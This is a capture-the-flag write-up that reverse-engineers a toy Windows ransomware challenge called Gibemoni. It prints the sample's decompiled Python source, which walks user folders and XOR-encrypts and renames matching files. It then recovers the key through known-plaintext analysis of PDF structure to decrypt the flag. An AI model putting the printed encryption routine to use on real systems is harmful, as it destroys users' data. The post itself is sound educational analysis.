---
author: eyJhb
categories: ctf hackit2018
date: "2018-11-17T10:00:00Z"
title: Hack IT 2018 - Challenge 2 - Gibemoni
---
In a previous post found ([Hack IT 2018 - Challenge 2 - Crymore]({% post_url 2018-11-17-hackit-2018-challenge-2-linux %})), 
I explained how break the Crymore ransomware. 
This post will instead focus on its Windows version called `Givemoni`, which uses a completely
different tactic of encrypting the users data.

The challenge contained the following two files:

- gibemoni.exe (binary file used to encrypt files)
- flag.pdf.important.GibeMoni (our encrypted flag - a pdf file)

First thing I always do when I get a binary, is to just run strings on it, `strings gibemoni.exe`.
Doing this, reveals a lot of strings containing the keyword `.pycPK`, which quickly
lead me to believe that this was some Python code converted to a `.exe` file.
Running `strings gibemoni.exe | grep -i python` reveals many strings containing the keyword Python.

```
,C:\Python34\lib\encodings\iso2022_jp_2004.pyr
)C:\Python34\lib\encodings\iso2022_jp_3.pyr
 C:\Python34\lib\sre_constants.pyr
C:\Python34\lib\http\client.py
"C:\Python34\lib\encodings\cp855.py
C:\Python34\lib\socket.py
+C:\Python34\lib\encodings\iso2022_jp_ext.pyr
C:\Users\martin\34\python\PCbuild\_lzma.pdb
```

From this we now know that we are dealing with Python code converted to a `.exe file`,
and it was properly done using `py2exe` which is the most popular tool for this task.
Besides this it can also be noted, that the version used for this is Python 3.4.

Now we need to extract the sourcecode for Gibemoni, which can be done using `unpy2exe` and `uncompyle6`
which both can be found in the official pip repository.

I ended up creating a Dockerfile, so that I could specify the version of Python I wanted to use.
I experienced that I needed Python version 3.4 for `unpy2exe` to work correctly, and then switch to 
Python 3.7 after to run `uncompyle6`.

`Dockerfile`
```
FROM python:3.4-alpine3.7

RUN pip install uncompyle6 unpy2exe
```

Running this, allows us to first extract the `.pyc` file, and then decompile that to readable Python code.

```
# build docker image from Dockerfile
docker build -t gib .
# run our docker image, with the currect directory mounted at /src
docker run --rm -it $(pwd):/src gib sh
cd /src
unpy2exe gibemoni.exe
# remember to change FROM in the Dockerfile to `FROM python:3.7-alpine3.7` and rebuild
uncompyle6 ransom.py.pyc > ransom.py
```

This should result in the following code 

`ransom.py`
```
# uncompyle6 version 3.2.4
# Python bytecode 3.4 (3310)
# Decompiled from: Python 3.7.1 (default, Nov 16 2018, 06:33:02) 
# [GCC 6.4.0]
# Embedded file name: ransom.py
# Compiled at: 2018-11-21 21:37:34
# Size of source mod 2**32: 212 bytes
import os

def find_important_files(startpath):
    for dirpath, dirs, files in os.walk(startpath):
        for f in files:
            abspath = os.path.abspath(os.path.join(dirpath, f))
            if abspath.split('.')[-1] == 'important':
                yield abspath
                continue


def encrypt_file(filename, key):
    i = 0
    with open(filename, 'r+b') as (f):
        plaintext = f.read(1)
        while plaintext:
            ciphertext = ord(plaintext) ^ key[i % 32]
            f.seek(-1, 1)
            f.write(bytes([ciphertext]))
            plaintext = f.read(1)
            i += 1


if __name__ == '__main__':
    print('Starting up...')
    print('HueHueHueHueHueHueHueHue')
    key = os.urandom(32)
    for f in find_important_files('/Users/'):
        encrypt_file(f, key)
        if os.path.exists(f + '.GibeMoni'):
            os.remove(f + '.GibeMoni')
        os.rename(f, f + '.GibeMoni')
        print('Encrypted: ' + f)
```

Keep in mind, I have cut off the last part which printed out the banner.
But now we can see what happens, when the ransomware encrypts the files.

On first glance in the `__main__`, we see that is generates a random 32 byte key,
that is used for encryption.
Looking at the `encrypt_file` function, we can see that it accepts a `filename` and a `key`.
The key is basically used to XOR the plaintext with.
This means that we need to find some way of recreating the key that was used to encrypt our flag.

As we know that the flag was a `.pdf` file, we know the first 7 bytes of the file, as all pdfs starts with `%PDF-1.`.
This means that we can find the first 7 bytes of the key, which will then allow us to find other patterns in the pdf,
as it reuses the key throughout the file.
This in turns, allows us to guess patterns until we have the full key used to XOR our flag.

The reason why we can to that is that if you know two parts of the XOR, then you can get the third part of it.
A example of this can be seen below, where we have two binary sequences and the result when you XOR them together ([How XOR works][wiki-xor-truth-table]).
After this, the result is being used with the second part, to recreate the first part of the XOR.
And as seen, the result is the original binary sequence.

```
010100
100100
------
110000


100100
110000
------
010100
```

So putting the information we know together, we can create a simple Python script to make our lives easier.

{{< highlight python "linenos=table" >}}
from __future__ import print_function
import os

class gibi(object):
    def getData(self, inputFile):
        return bytearray(open(inputFile, "rb").read())

    def encrypt(self, filebytes, key):
        size = len(filebytes)
        xorbyte = bytearray(size)
        i = 0
        for i in range(size):
            xorbyte[i] = filebytes[i] ^ key[i % 32]
        return xorbyte

    def run(self):
        encrypted = self.getData("encrypted")

        guess_key = []
        for x in range(32):
            guess_key.append(0x00)

        guess_key[0] = 0x25
        guess_key[1] = 0x50
        guess_key[2] = 0x44
        guess_key[3] = 0x46
        guess_key[4] = 0x2d
        guess_key[5] = 0x31
        guess_key[6] = 0x2e

        encrypted2 = self.encrypt(encrypted, guess_key)

        guess_key[0] = encrypted2[0]
        guess_key[1] = encrypted2[1]
        guess_key[2] = encrypted2[2]
        guess_key[3] = encrypted2[3]
        guess_key[4] = encrypted2[4]
        guess_key[5] = encrypted2[5]
        guess_key[6] = encrypted2[6]

        encrypted3 = self.encrypt(encrypted, guess_key)

        f = open("decrypted-part", "wb")
        f.write(encrypted3)

x = gibi()
x.run()
{{< / highlight >}}

So explaining this Python script step-by-step, we can see that we have our class `gibi`, followed by tree functions.

The first function `getData`, takes a filename and return the content of the file as a bytearray.

The next function `encrypt`, takes a bytearray and a key, then it creates a empty bytearray with the same length as the given bytearray.
After this it will loop over our bytes and XOR it using the specified key (looping around using modulus) and then return our new XOR'ed bytearray.

The third function `run` is the core of the program, which utilizes the two other functions.

- Line 17 - Get the content of our encrypted file as a bytearray
- Line 19-21 - Generate a 32-byte key with 0x00
- Line 23-29 - Specify the first 7 bytes to what we know (`%PDF-1.`)
    - So that we get the original key when XOR'ed (remember the XOR example from earlier)
- Line 31 - Encrypt the file using our key with the 7 bytes
- Line 33-39 - Replace the first 7 bytes of the key, with the first 7 bytes we just got by XOR 
- Line 41 - XOR the file again with our new key
- Line 43-44 - Write our new file

Now after all this code has run, we start the pattern game!
Basically we need to know some patterns in the file, so that we can guess the next character and thereby recreate the original key.

Doing some quick strings on a lot of pdf files, I gathered the following list of keywords.

```
\Length
Filter
\Filter \FlateDecode
stream
endstream
endobj

# end of file
endstream.endobj.startxref.178144.%%EOF
```

Combining this with the following function, which takes the bytearray and loops over it (start times) and prints out the following ...

- the key index used for this byte
- the decimal value of the byte
- print the ascii value (if printable)

```
def countable(self, filebytes, start):
    for x in range(start):
        mchr = ""
        if filebytes[x] > 32 and filebytes[x] < 127:
            mchr = chr(filebytes[x])
        print(str(x % 32)+" - "+str(filebytes[x])+" - "+mchr)
```

This looks something like this

```
0 - 115 - s
1 - 116 - t
2 - 97 - a
3 - 114 - r
4 - 116 - t
5 - 120 - x
6 - 114 - r
7 - 65 - A
8 - 112 - p
9 - 168 - 
```

Looking at this sample output, we can see that this looks a lot like `startxref`, but it is missing the `ef` part of it.
This fits perfectly with us only knowing the first 7 bytes of the key, so it is time for some manual decoding.

So taking the 7th key index `7 - 65 - A`, we know this needs to be a `e`.
By opening Python and doing what we learned `cipher ^ known = key` (in Python `hex(65 ^ ord("e"))`), we get 0x24 as a result.
This can now be appended to our Python script

```python
    def run(self):
        encrypted = self.getData("encrypted")

        guess_key = []
        for x in range(32):
            guess_key.append(0x00)

        guess_key[0] = 0x25
        guess_key[1] = 0x50
        guess_key[2] = 0x44
        guess_key[3] = 0x46
        guess_key[4] = 0x2d
        guess_key[5] = 0x31
        guess_key[6] = 0x2e

        encrypted2 = self.encrypt(encrypted, guess_key)

        guess_key[0] = encrypted2[0]
        guess_key[1] = encrypted2[1]
        guess_key[2] = encrypted2[2]
        guess_key[3] = encrypted2[3]
        guess_key[4] = encrypted2[4]
        guess_key[5] = encrypted2[5]
        guess_key[6] = encrypted2[6]
        guess_key[7] = 0x24

        encrypted3 = self.encrypt(encrypted, guess_key)

        f = open("decrypted-part", "wb")
        f.write(encrypted3)

```

So continuing finding patterns and doing this process, we will end up with the key

```
guess_key[0] = encrypted2[0]
guess_key[1] = encrypted2[1]
guess_key[2] = encrypted2[2]
guess_key[3] = encrypted2[3]
guess_key[4] = encrypted2[4]
guess_key[5] = encrypted2[5]
guess_key[6] = encrypted2[6]
guess_key[7] = 0x24
guess_key[8] = 0x16
guess_key[9] = 0xa2
guess_key[10] = 0xf1
guess_key[11] = 0xe4
guess_key[12] = 0xf9
guess_key[13] = 0xc8
guess_key[14] = 0x42
guess_key[15] = 0x2e
guess_key[16] = 0xe3
guess_key[17] = 0xde
guess_key[18] = 0x5b
guess_key[19] = 0x7a
guess_key[20] = 0x9e
guess_key[21] = 0x44
guess_key[22] = 0xf3
guess_key[23] = 0xda
guess_key[24] = 0x51
guess_key[25] = 0x3a
guess_key[26] = 0x97
guess_key[27] = 0x33
guess_key[28] = 0x62
guess_key[29] = 0xa6
guess_key[30] = 0xbb
guess_key[31] = 0xf9
```

Which now allows us to just run the Python script, open the decrypted file and get our flag!

```
HackIT{frugal_frugalware}
```

[wiki-xor-truth-table]: https://en.wikipedia.org/wiki/Exclusive_or#Truth_table
